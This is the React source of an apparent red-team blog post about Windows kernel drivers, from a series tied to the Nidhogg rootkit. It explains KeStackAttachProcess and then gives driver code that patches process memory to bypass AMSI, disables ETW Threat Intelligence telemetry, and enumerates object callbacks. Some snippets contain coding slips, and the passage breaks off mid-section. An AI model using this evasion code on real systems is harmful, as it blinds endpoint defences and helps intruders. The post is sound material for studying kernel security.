"use client";

import SecondaryHeader, {BlogPrologue, Code, InlineCode} from "@/components/BlogComponents";
import React from "react";
import StyledLink from "@/components/StyledLink";

export default function LordOfTheRing0P6() {
    let keStackAttachProcessP1 = `CurrentIrql = KeGetCurrentIrql();
__writecr8(DISPATCH_LEVEL);
if ( KiIrqlFlags && (KiIrqlFlags & 1) != 0 && CurrentIrql <= 0xFu )
{
  SchedulerAssist = KeGetCurrentPrcb()->SchedulerAssist;
  SchedulerAssist[5] |= (-1 << (CurrentIrql + 1)) & 4;
}
CurrentPrcb = KeGetCurrentPrcb();
v15 = 0;
v8 = CurrentPrcb->SchedulerAssist;
// ...
while ( _interlockedbittestandset64((volatile signed __int32 *)&CurrentThread->ThreadLock, 0LL) )
{
  // ...
  
  do
    KeYieldProcessorEx(&v15);
  while ( CurrentThread->ThreadLock );
  
  // ...
}`;

    let keStackAttachProcessP2 = `currentApcState = &currentThread->152;
currentSavedApcState = &currentThread->600;
currentThread->SavedApcState.Process = currentThread->ApcState.Process;
currentThread->SavedApcState.InProgressFlags = currentThread->ApcState.InProgressFlags;
currentThread->SavedApcState.KernelApcPending = currentThread->ApcState.KernelApcPending;
currentThread->SavedApcState.UserApcPendingAll = currentThread->ApcState.UserApcPendingAll;
v13 = currentThread->ApcState.ApcListHead[0].Flink;
if ( ($871919957987849CFE33C84F378E5D13 *)currentApcState->ApcState.ApcListHead[0].Flink == currentApcState )
{
  currentThread->SavedApcState.ApcListHead[0].Blink = currentThread->SavedApcState.ApcListHead;
  currentSavedApcState->SavedApcState.ApcListHead[0].Flink = (_LIST_ENTRY *)currentSavedApcState;
  currentThread->SavedApcState.KernelApcPending = 0;
}
else
{
  v27 = currentThread->ApcState.ApcListHead[0].Blink;
  currentSavedApcState->SavedApcState.ApcListHead[0].Flink = v13;
  currentThread->SavedApcState.ApcListHead[0].Blink = v27;
  v13->Blink = (_LIST_ENTRY *)currentSavedApcState;
  v27->Flink = (_LIST_ENTRY *)currentSavedApcState;
}
v14 = (struct _KTHREAD *)currentThread->ApcState.ApcListHead[1].Flink;
v15 = &currentThread->SavedApcState.ApcListHead[1];
if ( v14 == (struct _KTHREAD *)&currentThread->ApcStateFill[16] )
{
  currentThread->SavedApcState.ApcListHead[1].Blink = &currentThread->SavedApcState.ApcListHead[1];
  v15->Flink = v15;
  currentThread->SavedApcState.UserApcPendingAll = 0;
}
else
{
  v25 = currentThread->ApcState.ApcListHead[1].Blink;
  v15->Flink = (_LIST_ENTRY *)v14;
  currentThread->SavedApcState.ApcListHead[1].Blink = v25;
  v14->Header.WaitListHead.Flink = v15;
  v25->Flink = v15;
}
currentThread->ApcState.ApcListHead[0].Blink = currentThread->ApcState.ApcListHead;
currentThread->ApcState.ApcListHead[1].Blink = &currentThread->ApcState.ApcListHead[1];
currentThread->ApcState.ApcListHead[1].Flink = &currentThread->ApcState.ApcListHead[1];
currentApcState->ApcState.ApcListHead[0].Flink = (_LIST_ENTRY *)currentApcState;
currentThread->ApcStateIndex = 1;
*(_WORD *)&currentThread->ApcStateFill[40] = 0;
currentThread->ApcState.UserApcPendingAll = 0;

if ( ... && (_InterlockedExchangeAdd(&Process->Pcb.StackCount.Value, 8u) & 7) != 0 )// Increase stack count
{
 ...
}`;

    let keStackAttachProcessP3 = `if ( KiKvaShadow )
{
  v22 = Process->DirectoryTableBase;
  if ( (DirectoryTableBase & 2) != 0 )
    v22 = DirectoryTableBase | 0x8000000000000000uLL;
  __writegsqword(0x9000u, v22);
  KiSetAddressPolicy(Process->AddressPolicy);
}
result = (unsigned int)HvlEnlightenments;
if ( (HvlEnlightenments & 1) != 0 )
  result = HvlSwitchVirtualAddressSpace(DirectoryTableBase);
else
  __writecr3(DirectoryTableBase);
if ( !KiFlushPcid && KiKvaShadow )
{
  v36 = __readcr4();
  if ( (v36 & 0x20080) != 0 ) // Check if PGE is enabled or not
  {
    result = v36 ^ 0x80;
    __writecr4(v36 ^ 0x80);
    __writecr4(v36);
  }
  else
  {
    result = __readcr3();
    __writecr3(result);
  }
}`;

    let patcherCodeP1 = `#define DRIVER_PREFIX "Patcher: "
#define DRIVER_DEVICE_NAME L"\\\\Device\\\\Patcher"
#define DRIVER_SYMBOLIC_LINK L"\\\\??\\\\Patcher"

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
UNREFERENCED_PARAMETER(RegistryPath);
NTSTATUS status = STATUS_SUCCESS;

UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);

// Creating device and symbolic link.
status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

if (!NT_SUCCESS(status)) {
    KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\\n", status));
    return status;
}

status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

if (!NT_SUCCESS(status)) {
    KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\\n", status));
    IoDeleteDevice(DeviceObject);
    return status;
}

DriverObject->DriverUnload = MyUnload;
DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = PatcherCreateClose;
DriverObject->MajorFunction[IRP_MJ_WRITE] = PatcherWrite;
return status;
}

NTSTATUS PatcherCreateClose(PDEVICE_OBJECT, PIRP Irp) {
\tIrp->IoStatus.Status = STATUS_SUCCESS;
\tIrp->IoStatus.Information = 0;
\tIoCompleteRequest(Irp, IO_NO_INCREMENT);
\treturn STATUS_SUCCESS;
}

void PatcherUnload(PDRIVER_OBJECT DriverObject) {
\tKdPrint((DRIVER_PREFIX "Unloading...\\n"));

\tUNICODE_STRING symbolicLink = DRIVER_SYMBOLIC_LINK;
\tIoDeleteSymbolicLink(&symbolicLink);
\tIoDeleteDevice(DriverObject->DeviceObject);
}`;

    let patcherCodeP2 = `struct PatchInformation {
\tULONG Pid;
\tPVOID Patch;
\tULONG PatchLength;
\tCHAR* FunctionName;
\tWCHAR* ModuleName;
};`;

    let patcherCodeP3 = `NTSTATUS PatchModule(PatchInformation* PatchInfo) {
\tPEPROCESS TargetProcess;
\tKAPC_STATE state;
\tPVOID functionAddress = NULL;
\tPVOID moduleImageBase = NULL;
\tWCHAR* moduleName = NULL;
\tCHAR* functionName = NULL;
\tNTSTATUS status = STATUS_UNSUCCESSFUL;

\t// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
\tSIZE_T moduleNameSize = (wcslen(PatchInformation->ModuleName) + 1) * sizeof(WCHAR);
\tMemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
\tstatus = moduleNameAllocator.CopyData(PatchInformation->ModuleName, moduleNameSize);

\tif (!NT_SUCCESS(status))
\t\treturn status;

\tSIZE_T functionNameSize = (wcslen(PatchInformation->ModuleName) + 1) * sizeof(WCHAR);
\tMemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize);
\tstatus = functionNameAllocator.CopyData(PatchInformation->FunctionName, functionNameSize);

\tif (!NT_SUCCESS(status))
\t\treturn status;

\tstatus = PsLookupProcessByProcessId((HANDLE)PatchInformation->Pid, &TargetProcess);

\tif (!NT_SUCCESS(status))
\t\treturn status;

\t// Getting the PEB.
\tKeStackAttachProcess(TargetProcess, &state);
\tmoduleImageBase = GetModuleBase(TargetProcess, moduleName);

\tif (!moduleImageBase) {
\t\tKeUnstackDetachProcess(&state);
\t\tObDereferenceObject(TargetProcess);
\t\treturn STATUS_UNSUCCESSFUL;
\t}

\tfunctionAddress = GetFunctionAddress(moduleImageBase, functionName);

\tif (!functionAddress) {
\t\tKeUnstackDetachProcess(&state);
\t\tObDereferenceObject(TargetProcess);
\t\treturn STATUS_UNSUCCESSFUL;
\t}
\tKeUnstackDetachProcess(&state);

\tstatus = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);
\tObDereferenceObject(TargetProcess);
\treturn status;
}`;

    let patcherCodeP4 = `PVOID moduleBase = NULL;
LARGE_INTEGER time = { 0 };
time.QuadPart = -100ll * 10 * 1000;

PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(Process);

if (!targetPeb)
\treturn moduleBase;

for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
\tKeDelayExecutionThread(KernelMode, FALSE, &time);
}

if (!targetPeb->LoaderData)
\treturn moduleBase;

// Getting the module's image base.
for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
\tpListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
\tpListEntry = pListEntry->Flink) {

\tPLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

\tif (pEntry->FullDllName.Length > 0) {
\t\tif (IsIContained(pEntry->FullDllName, moduleName)) {
\t\t\tmoduleBase = pEntry->DllBase;
\t\t\tbreak;
\t\t}
\t}
}

return moduleBase;`;

    let patcherCodeP5 = `PVOID functionAddress = NULL;
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

if (!dosHeader)
\treturn functionAddress;

// Checking that the image is valid PE file.
if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
\treturn functionAddress;

PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)moduleBase + dosHeader->e_lfanew);

if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
\treturn functionAddress;

IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
\treturn functionAddress;

// Iterating the export directory.
PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

DWORD* addresses = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfFunctions);
WORD* ordinals = (WORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNameOrdinals);
DWORD* names = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNames);

for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
\tif (_stricmp((char*)((PUCHAR)moduleBase + names[j]), functionName) == 0) {
\t\tfunctionAddress = (PUCHAR)moduleBase + addresses[ordinals[j]];
\t\tbreak;
\t}
}

return functionAddress;`;

    let keWriteProcessMemory = `NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
\tHANDLE hTargetProcess;
\tULONG oldProtection;
\tSIZE_T patchLen;
\tSIZE_T bytesWritten;
\tNTSTATUS status = STATUS_SUCCESS;

\tif (mode != KernelMode && mode != UserMode)
\t\treturn STATUS_UNSUCCESSFUL;

\t// Making sure that the given kernel mode address is valid.
\tif (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
\t\tstatus = STATUS_UNSUCCESSFUL;
\t\treturn status;
\t}
\telse if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
\t\tstatus = STATUS_UNSUCCESSFUL;
\t\treturn status;
\t}

\t// Adding write permissions.
\tstatus = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess);

\tif (!NT_SUCCESS(status)) {
\t\treturn status;
\t}

\tpatchLen = dataSize;
\tPVOID addressToProtect = targetAddress;
\tstatus = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);

\tif (!NT_SUCCESS(status)) {
\t\tZwClose(hTargetProcess);
\t\treturn status;
\t}
\tZwClose(hTargetProcess);

\t// Writing the data.
\tstatus = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);

\t// Restoring permissions and cleaning up.
\tif (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess) == STATUS_SUCCESS) {
\t\tpatchLen = dataSize;
\t\tZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
\t\tZwClose(hTargetProcess);
\t}

\treturn status;
}`;

    let patcherCodeP6 = `NTSTATUS PatcherWrite(PDEVICE_OBJECT, PIRP Irp) {
\tPatchInformation patchedModule{};
\tNTSTATUS status = STATUS_SUCCESS;
\tSIZE_T len = 0;
\tauto stack = IoGetCurrentIrpStackLocation(Irp);

\tauto size = stack->Parameters.DeviceIoControl.InputBufferLength;

\tif (size == 0 || size % sizeof(PatchInformation) != 0) {
\t\tstatus = STATUS_INVALID_BUFFER_SIZE;
\t\tgoto Exit;
\t}

\tauto data = (PatchInformation*)Irp->AssociatedIrp.SystemBuffer;
\tpatchedModule.Pid = data->Pid;
\tpatchedModule.PatchLength = data->PatchLength;
\t
\tSIZE_T strSize = strlen(data->FunctionName);
\tMemoryAllocator<CHAR*> functionNameAllocator(&patchedModule.FunctionName, strSize);
\tstatus = functionNameAllocator.CopyData(data->FunctionName, strSize);
\t
\tif (!NT_SUCCESS(status))
\t\tbreak;
\t
\tstrSize = wcslen(data->ModuleName) * sizeof(WCHAR);
\tMemoryAllocator<WCHAR*> moduleNameAllocator(&patchedModule.ModuleName, strSize);
\tstatus = moduleNameAllocator.CopyData(data->ModuleName, strSize);
\t
\tif (!NT_SUCCESS(status))
\t\tbreak;
\t
\tMemoryAllocator<PVOID> patchAllocator(&patchedModule.Patch, data->PatchLength);
\tstatus = patchAllocator.CopyData(data->Patch, data->PatchLength);
\t
\tif (!NT_SUCCESS(status))
\t\tbreak;
\t
\tif (data->Pid <= 4) {
\t\tPrint(DRIVER_PREFIX "Invalid PID.\\n");
\t\tstatus = STATUS_INVALID_PARAMETER;
\t\tbreak;
\t}
\tstatus = PatchModule(&patchedModule);

\tlen += sizeof(PatchInformation);
\tIrp->IoStatus.Status = status;
\tIrp->IoStatus.Information = len;
\tIoCompleteRequest(Irp, IO_NO_INCREMENT);
\treturn STATUS_SUCCESS;
}`;
    let patcherUmP1 = "int main() {\nDWORD bytesWritten;\nstd::vector<byte> patch = \{ 0xB8, 0x57, 0x00, " +
        "0x07, 0x80, 0xC3 \};";

    let patcherUm = patcherUmP1 + `
    
    if (hDrv == INVALID_HANDLE_VALUE)
\t\t    return 0;
\t\t
\t\tPatchInformation patchedModule{}
\t\t
\t\tpatchedModule.Pid = pid;
\t\tpatchedModule.PatchLength = (ULONG)patch.size();
\t\tpatchedModule.ModuleName = moduleName;
\t\tpatchedModule.FunctionName = functionName;
\t\tpatchedModule.Patch = patch.data();

    if (pid <= SYSTEM_PID || patchedModule.ModuleName == nullptr || 
\tpatchedModule.FunctionName == nullptr || patchedModule.Patch == nullptr) {
\t\t\tCloseHandle(hDrv);
\t\t\treturn 0;
\t}

    BOOL result = WriteFile(hDrv, &patchedModule, sizeof(patchedModule), &bytesWritten, NULL)
    
    if (result)
\t\t    std::cout << "Patched!" << std::endl;
\t\telse
\t\t\t\tstd::cout << "Failed to patch" << std::endl;
\t\t
    CloseHandle(hDrv);
    return result;
}`;

    let enableDisableEtwti = `NTSTATUS EnableDisableEtwTI(bool enable) {
\tNTSTATUS status = STATUS_SUCCESS;
\tEX_PUSH_LOCK etwThreatIntLock = NULL;
\tULONG foundIndex = 0;
\tSIZE_T bytesWritten = 0;
\tSIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);

\t// Getting the location of KeInsertQueueApc dynamically to get the real location.
\tUNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
\tPVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);

\tif (!searchedRoutineAddress)
\t\treturn STATUS_NOT_FOUND;

\tSIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
\tPLONG searchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature1,
\t\t0xCC, etwThreatIntProvRegHandleSigLen - 1,
\t\tsearchedRoutineAddress, targetFunctionDistance,
\t\t&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);

\tif (!searchedRoutineOffset) {
\t\tsearchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature2,
\t\t\t0xCC, etwThreatIntProvRegHandleSigLen - 1,
\t\t\tsearchedRoutineAddress, targetFunctionDistance,
\t\t\t&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);

\t\tif (!searchedRoutineOffset)
\t\t\treturn STATUS_NOT_FOUND;
\t}
\tPUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
\tULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();

\tif (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL)
\t\treturn STATUS_UNSUCCESSFUL;

\tPTRACE_ENABLE_INFO enableProviderInfo = (PTRACE_ENABLE_INFO)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + enableProviderInfoOffset);
\tULONG lockOffset = GetEtwGuidLockOffset();

\tif (lockOffset != (ULONG)STATUS_UNSUCCESSFUL) {
\t\tetwThreatIntLock = (EX_PUSH_LOCK)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + lockOffset);
\t\tExAcquirePushLockExclusiveEx(&etwThreatIntLock, 0);
\t}

\tif (enable) {
\t\tstatus = MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);

\t\tif (NT_SUCCESS(status))
\t\t\tthis->PrevEtwTiValue = 0;
\t}
\telse {
\t\tULONG disableEtw = 0;
\t\tstatus = NidhoggMemoryUtils->KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);

\t\tif (NT_SUCCESS(status))
\t\t\tstatus = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
\t}

\tif (etwThreatIntLock)
\t\tExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);

\treturn status;
}`;

    let etwtiExplanationP1 = `; ...
lea     r9, EtwThreatIntProvRegHandle
xor     r8d, r8d
xor     edx, edx
lea     rcx, ThreatIntProviderGuid
call    EtwRegister
; ...`;

    let etwtiExplanationP2 = `; ...
push    r14
push    r15
sub     rsp, 60h
mov     r12, r8
mov     r13, rdx
mov     rsi, rcx
xor     edx, edx
mov     rcx, cs:EtwThreatIntProvRegHandle
mov     r8d, 3000h
call    EtwProviderEnabled
; ...`;

    let etwtiExplanationP3 = `; ...
41 56                   push    r14
41 57                   push    r15
48 83 EC 60             sub     rsp, 60h
4D 8B E0                mov     r12, r8
4C 8B EA                mov     r13, rdx
48 8B F1                mov     rsi, rcx
33 D2                   xor     edx, edx
48 8B 0D 8D 18 91 00    mov     rcx, cs:EtwThreatIntProvRegHandle
41 B8 00 30 00 00       mov     r8d, 3000h
E8 2A 04 00 00          call    EtwProviderEnabled
; ...`;

    let listCallbacks = `NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks) {
\tNTSTATUS status = STATUS_SUCCESS;
\tPFULL_OBJECT_TYPE objectType = NULL;
\tCHAR driverName[MAX_DRIVER_PATH] = { 0 };
\terrno_t err = 0;
\tULONG index = 0;

\tswitch (Callbacks->Type) {
\tcase ObProcessType:
\t\tobjectType = (PFULL_OBJECT_TYPE)*PsProcessType;
\t\tbreak;
\tcase ObThreadType:
\t\tobjectType = (PFULL_OBJECT_TYPE)*PsThreadType;
\t\tbreak;
\tdefault:
\t\tstatus = STATUS_INVALID_PARAMETER;
\t\tbreak;
\t}

\tif (!NT_SUCCESS(status))
\t\treturn status;

\tExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
\tPOB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);

\tif (Callbacks->NumberOfCallbacks == 0) {
\t\tdo {
\t\t\tif (currentObjectCallback->Enabled) {
\t\t\t\tif (currentObjectCallback->PostOperation || currentObjectCallback->PreOperation)
\t\t\t\t\tCallbacks->NumberOfCallbacks++;
\t\t\t}
\t\t\tcurrentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
\t\t} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
\t}
\telse {
\t\tdo {
\t\t\tif (currentObjectCallback->Enabled) {
\t\t\t\tif (currentObjectCallback->PostOperation) {
\t\t\t\t\tif (NT_SUCCESS(MatchCallback(currentObjectCallback->PostOperation, driverName))) {
\t\t\t\t\t\terr = strcpy_s(Callbacks->Callbacks[index].DriverName, driverName);

\t\t\t\t\t\tif (err != 0) {
\t\t\t\t\t\t\tstatus = STATUS_ABANDONED;
\t\t\t\t\t\t\tbreak;
\t\t\t\t\t\t}
\t\t\t\t\t}

\t\t\t\t\tCallbacks->Callbacks[index].PostOperation = currentObjectCallback->PostOperation;
\t\t\t\t}
\t\t\t\tif (currentObjectCallback->PreOperation) {
\t\t\t\t\tif (NT_SUCCESS(MatchCallback(currentObjectCallback->PreOperation, driverName))) {
\t\t\t\t\t\terr = strcpy_s(Callbacks->Callbacks[index].DriverName, driverName);

\t\t\t\t\t\tif (err != 0) {
\t\t\t\t\t\t\tstatus = STATUS_ABANDONED;
\t\t\t\t\t\t\tbreak;
\t\t\t\t\t\t}
\t\t\t\t\t}

\t\t\t\t\tCallbacks->Callbacks[index].PreOperation = currentObjectCallback->PreOperation;
\t\t\t\t}
\t\t\t\tindex++;
\t\t\t}
\t\t\tcurrentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
\t\t} while (index != Callbacks->NumberOfCallbacks && (PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
\t}
\tExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
\treturn status;
}`;

    return (
        <div className="bg-bgInsideDiv p-6 rounded-xl h-full">
            <BlogPrologue title="Lord Of The Ring0 - Part 6 | Conclusion"
                          date="31.03.2024" projectLink="https://github.com/Idov31/Nidhogg"/>
            <div className="pt-4">
                <article>
                    <SecondaryHeader text="Prologue"/>
                    <div className="pt-4">
                        In the <StyledLink href="/posts/lord-of-the-ring0-p5" content="last blog post"
                                           textSize="text-md"/>, we learned about two common hooking methods (
                        <InlineCode text="IRP Hooking"/> and <InlineCode text="SSDT Hooking"/>) and two different
                        injection techniques from the kernel to the user mode for both shellcode and DLL (APC and
                        <InlineCode text=" CreateThread"/>) with code snippets and examples from Nidhogg.

                        <div className="pt-2">
                            In this blog post, we will write a simple driver that is capable of bypassing AMSI to
                            demonstrate patching usermode memory from the kernel, go through credential dumping process
                            from the kernel and finish with tampering various kernel callbacks as an example for
                            patching kernel mode memory and last but not least - <StyledLink href="#the-end?"
                                                                                             content="the final words and conclusion"
                                                                                             textSize="text-md"/> of
                            this series.
                        </div>
                    </div>

                    <SecondaryHeader text="Interacting With Usermode Memory"/>
                    <div className="pt-4">
                        While there are couple of methods to perform operations from kernel mode on user mode processes,
                        in this part I will focus on one of the most common methods that allow it with ease -
                        <InlineCode text=" KeStackAttachProcess"/>.

                        <div className="pt-2">
                            When interacting with user mode process from a kernel driver the driver author would like to
                            have a complete control over the process memory - whether it is for reading or writing
                            memory.
                            When using <InlineCode text="KeStackAttachProcess"/> the current thread on the kernel mode
                            side attaches to the
                            process&apos;s address space, allowing it to access any memory inside the process. It is
                            important to
                            note that when attaching to the process&apos;s memory can prevent from async I/Os from
                            happening and
                            might cause deadlocks. For this reason it is very important to make the code as simple as
                            possible and call <InlineCode text="KeUnstackDetachProcess"/> as soon as possible.
                        </div>

                        <div className="pt-2">
                            <b>NOTE: The following part will be a deep dive on how the function works, if you want, you
                                can skip to the <StyledLink href="#coding-amsi-bypass-driver"
                                                            content="Coding AMSI Bypass Driver"
                                                            textSize="text-md"/> part.</b>
                        </div>

                        <div className="pt-2">
                            This part, will be dedicated to go through <InlineCode text="KeStackAttachProcess"/>
                            thoroughly. For the sake of simplicity, I will go through the interesting branch of
                            attaching to remote process and clean up some of the decompiled output. To give a little bit
                            of background, <InlineCode text="KeStackAttachProcess"/> is being called with <InlineCode
                            text="EPROCESS"/> of the process that will be attached as the first parameter, and a pointer
                            to <InlineCode text="KAPC_STATE"/> to save the original state as the second parameter. The
                            below decompile result is done on Windows 11 22H2 and the output may be differ in different
                            windows versions.
                        </div>
                        <Code text={keStackAttachProcessP1}/>

                        One of the first things that are being done, is saving the current IRQL and raising the IRQL to
                        <InlineCode text=" DISPATCH_LEVEL"/> by writing to <InlineCode text="CR8"/> register, it is
                        being
                        done to make sure synchronization and that there are no other threads that can interrupt this
                        process. If you are more interested to learn about IRQLs, please refer to
                        <StyledLink href="https://www.offsec.com/offsec/irqls-close-encounters/" content=" this"
                                    textSize="text-md"/> article by Offsec that explains more about the subject.

                        <div className="pt-2">
                            Later on, it waits to set the first bit of the <InlineCode text="ThreadLock"/> of the
                            current thread, to insure there won&apos;t be another thread that interfering with the
                            current thread. Note that it is using <InlineCode text="_interlockedbittestandset64"/> which
                            is an atomic operation to make sure it can actually write to it.
                        </div>

                        <div className="pt-2">
                            The <InlineCode text="KeYieldProcessorEx"/> is also part of synchronization that signals the
                            processor that the current thread needs to do the operation mentioned above. After this code
                            block, the <InlineCode text="CurrentThread->ApcStateIndex"/> will be checked to determine
                            how to call <InlineCode text="KiAttachProcess"/> - if <InlineCode text="ApcStateIndex"/> is
                            nonzero it means the thread is running in the target&apos;s process context, and on the
                            first time a thread is attempting to attach to the target process it will be 0 and an extra
                            work to save the original state will be required.
                        </div>
                        <Code text={keStackAttachProcessP2}/>

                        Once the thread is synchronized, now it can use the <InlineCode text="SavedApcState"/> structure
                        to store the previous APC information such as flags, pointers, lists, etc. Once saving the APC
                        state is done, it is added to the top of the list. Lastly, the <InlineCode
                        text="Process->Pcb.StackCount.Value"/> is incremented by 8, if the result is multiplications of
                        8, it will release the lock and then try to do similar process to acquiring the thread lock
                        mentioned above.

                        <Code text={keStackAttachProcessP3}/>

                        For the final part, there is a check if <InlineCode text="KvaShadow"/> is enabled (kernel
                        virtual addresses, explained in detail <StyledLink
                        href="https://msrc.microsoft.com/blog/2018/03/kva-shadow-mitigating-meltdown-on-windows/"
                        content="here" textSize="text-md"/> that was
                        introduce as a mitigation against side channel attacks such as Meltdown and if so will apply the
                        protection accordingly.

                        <div className="pt-2">
                            Then, another check is performed to check if <InlineCode text="VBS"/> (Virtual Based
                            Security) is enabled on the system. If so, the address switching will be performed in VTL1
                            (If you are interested to know why this check is being performed please check <StyledLink
                            href="https://connormcgarr.github.io/hvci/"
                            content="Connor McGarr’s great article on the matter" textSize="text-md"/>. If <InlineCode
                            text="VBS"/> isn&apos;t enabled, the <InlineCode text="CR3"/> register will be written
                            directly (The <InlineCode text="CR3"/> register is holding the page directory base address
                            that is then used by the processor to translate virtual addresses to physical ones). I
                            won&apos;t go into detail with the later part as it is related to performance improvement
                            (As far as I&apos;m aware, <InlineCode text="KiFlushPcid"/> is a feature that allows to not
                            flush all <StyledLink href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer"
                                                  content="TLB records" textSize="text-md"/> each time <InlineCode
                            text="CR3"/> is changed to
                            improve performance).
                        </div>

                        <div className="pt-2">
                            Once this is done, the current thread will run in a way that it is accessible to the address
                            space of the remote process.
                        </div>
                    </div>

                    <SecondaryHeader text="Coding AMSI Bypass Driver"/>
                    <div className="pt-4">
                        To code the AMSI bypass driver, we will utilize the knowledge accumulated in the previous
                        section to attach to the remote process and modify its memory. For a more complete
                        implementation of patching user mode memory, please look at <StyledLink
                        href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/MemoryUtils.cpp#L388-L439"
                        content="Nidhogg’s implementation" textSize="text-md"/>.

                        <div className="pt-2">
                            First, we will start with the regular definitions of the driver entry and unloading
                            functions:
                        </div>

                        <Code text={patcherCodeP1}/>
                        For the <InlineCode text="Patch"/> function, we will get a structure named <InlineCode
                        text="PatchInformation"/> that is defined as so:

                        <Code text={patcherCodeP2}/>
                        Now, let&apos;s define and go through the <InlineCode text="Patch"/> function:

                        <Code text={patcherCodeP3}/>
                        The definitions for the <InlineCode text="MemoryAllocator"/> can be found <StyledLink
                        href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/MemoryAllocator.hpp"
                        content="here" textSize="text-md"/> as I will not go through it to stay focused on the subject.
                        First thing that is being done, is copying the parameter to local variables so they will be
                        accessible after the <InlineCode text="KeStackAttachProcess"/> function is executed (the reason
                        why they will not be accessible otherwise is due to reasons that explained in the <StyledLink
                        href="#interacting-with-usermode-memory" content="previous section" textSize="text-md"/>).
                        Afterwards, a call to achieve the <InlineCode text="EPROCESS"/> structure of the target process
                        is made and if such process exists then the current thread will attach it.

                        <div className="pt-2">
